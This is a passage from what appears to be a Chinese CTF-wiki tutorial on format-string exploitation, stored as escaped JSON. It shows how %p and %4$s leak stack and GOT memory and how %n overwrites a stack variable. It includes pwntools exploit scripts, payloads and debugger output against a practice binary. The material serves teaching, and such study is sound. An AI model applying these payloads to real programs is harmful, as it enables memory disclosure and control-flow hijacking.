5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 00000001 .22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7% \u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory %4 $s 00000001 .22222222.ffffffff.%4 $s [ 1 ] 61439 segmentation fault ( core dumped ) ./leakmemory \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002 \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffcd0c' , 'l8' ] 8 0xffffcd0c\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd20 \u2192 \"%4 $s \" 0xffffcd14\u2502+0x08: 0xffffcd20 \u2192 \"%4 $s \" 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: \"%4 $s \" \u2190 $eax 0xffffcd24\u2502+0x18: 0xffffce00 \u2192 0x00000000 0xffffcd28\u2502+0x1c: 0x000000e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20 \"%4$s\") [ #1] 0x80484ce \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 help x/ Examine memory: x/FMT ADDRESS. ADDRESS is an expression for the memory address to examine. FMT is a repeat count followed by a format letter and a size letter. Format letters are o ( octal ) , x ( hex ) , d ( decimal ) , u ( unsigned decimal ) , t ( binary ) , f ( float ) , a ( address ) , i ( instruction ) , c ( char ) , s ( string ) and z ( hex, zero padded on the left ) . Size letters are b ( byte ) , h ( halfword ) , w ( word ) , g ( giant, 8 bytes ) . The specified number of objects of the specified size are printed according to the format. Defaults for format and size letters are those previously used. Default count is 1 . Default address is following last thing printed with this command or \"print\" . gef\u27a4 x/x 0xffffcd20 0xffffcd20: 0x73243425 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x0804b000 0x0806c000 0x00000000 rw- [ heap ] 0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so 0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7fb1000 0x00000000 rw- 0xf7fd3000 0xf7fd5000 0x00000000 rw- 0xf7fd5000 0xf7fd7000 0x00000000 r-- [ vvar ] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [ vdso ] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rw- 0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so 0xffedd000 0xffffe000 0x00000000 rw- [ stack ] gef\u27a4 x/x 0x73243425 0x73243425: Cannot access memory at address 0x73243425 \u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002 \u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b \u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002 gef\u27a4 got /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a \u6587\u4ef6\u683c\u5f0f elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a00c R_386_JUMP_SLOT printf@GLIBC_2.0 0804a010 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a014 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 \u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b from pwn import * sh = process ( './leakmemory' ) leakmemory = ELF ( './leakmemory' ) __isoc99_scanf_got = leakmemory . got [ '__isoc99_scanf' ] print hex ( __isoc99_scanf_got ) payload = p32 ( __isoc99_scanf_got ) + '%4$s' print payload gdb . attach ( sh ) sh . sendline ( payload ) sh . recvuntil ( '%4$s \\n ' ) print hex ( u32 ( sh . recv ()[ 4 : 8 ])) # remove the first bytes of __isoc99_scanf@got sh . interactive () \u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa \u2192 0xf7615670 < printf + 0 > call 0xf76ebb09 < __x86 . get_pc_thunk . ax > \u21b3 0xf76ebb09 < __x86 . get_pc_thunk . ax + 0 > mov eax , DWORD PTR [ esp ] 0xf76ebb0c < __x86 . get_pc_thunk . ax + 3 > ret 0xf76ebb0d < __x86 . get_pc_thunk . dx + 0 > mov edx , DWORD PTR [ esp ] 0xf76ebb10 < __x86 . get_pc_thunk . dx + 3 > ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffbbf8dc' , 'l8' ] 8 0xffbbf8dc \u2502 + 0x00 : 0x080484ce \u2192 < main + 99 > add esp , 0x10 \u2190 $ esp 0xffbbf8e0 \u2502 + 0x04 : 0xffbbf8f0 \u2192 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp 0xffbbf8e4 \u2502 + 0x08 : 0xffbbf8f0 \u2192 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp 0xffbbf8e8 \u2502 + 0x0c : 0x000000c2 0xffbbf8ec \u2502 + 0x10 : 0xf765c6bb \u2192 < handle_intel + 107 > add esp , 0x10 0xffbbf8f0 \u2502 + 0x14 : 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp \u2190 $ eax 0xffbbf8f4 \u2502 + 0x18 : \"%4$s\" 0xffbbf8f8 \u2502 + 0x1c : 0x00000000 \u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b \u279c leakmemory git :( master ) \u2717 python exploit . py [ + ] Starting local process './leakmemory' : pid 65363 [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory' Arch : i386 - 32 - little RELRO : Partial RELRO Stack : No canary found NX : NX enabled PIE : No PIE ( 0x8048000 ) 0x804a014 \\ x14 \\ xa0 \\ x0 % 4 $ s [ * ] running in new terminal : / usr / bin / gdb - q \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\" 65363 [ + ] Waiting for debugger : Done 0xf76280c0 [ * ] Switching to interactive mode [ * ] Process './leakmemory' stopped with exit code 0 ( pid 65363 ) [ * ] Got EOF while reading in interactiv \u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002 \u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002 [padding][addr] \u6ce8\u610f \u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"\\x0c\\xa0\\x04\\x08%4 $s \" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"\\x0c\\xa0\\x04\\x08%4 $s \" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"\\x0c\\xa0\\x04\\x08%4 $s \" \u2190 $eax 0xffffcd14\u2502+0x18: \"\\xa0\\x04\\x08%4 $s \" 0xffffcd18\u2502+0x1c: \"\\x04\\x08%4 $s \" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10 \"\\\\x0c\\\\xa0\\\\x04\\\\x08%4$s\") [ #1] 0x80484ce \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 x/x 0xffffcd10 0xffffcd10: 0x6330785c","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_8","text":"\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b %n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002 \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002 /* example/overflow/overflow.c */ #include <stdio.h> int a = 123 , b = 456 ; int main () { int c = 789 ; char s [ 100 ]; printf ( \"%p \\n \" , & c ); scanf ( \"%s\" , s ); printf ( s ); if ( c == 16 ) { puts ( \"modified c.\" ); } else if ( a == 2 ) { puts ( \"modified a for a small number.\" ); } else if ( b == 0x12345678 ) { puts ( \"modified b for a big number!\" ); } return 0 ; } makefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload ...[overwrite addr]....%[overwrite offset]$n \u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u8fdb\u884c\u8986\u76d6","title":"\u8986\u76d6\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_9","text":"","title":"\u8986\u76d6\u6808\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_10","text":"\u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002","title":"\u786e\u5b9a\u8986\u76d6\u5730\u5740"},{"location":"pwn/fmtstr/fmtstr_exploit/#_11","text":"\u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5 \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffcd0c' , 'l8' ] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002","title":"\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"},{"location":"pwn/fmtstr/fmtstr_exploit/#_12","text":"\u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc (): sh = process ( './overwrite' ) c_addr = int ( sh . recvuntil ( ' \\n ' , drop = True ), 16 ) print hex ( c_addr ) payload = p32 ( c_addr ) + ' %012d ' + '%6$n' print payload #gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive () forc () \u7ed3\u679c\u5982\u4e0b \u279c overwrite git: ( master ) \u2717 python exploit.py [ + ] Starting local process './overwrite' : pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6 $n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u8fdb\u884c\u8986\u76d6"},{"location":"pwn/fmtstr/fmtstr_exploit/#_13","text":"","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_14","text":"\u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c \u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57 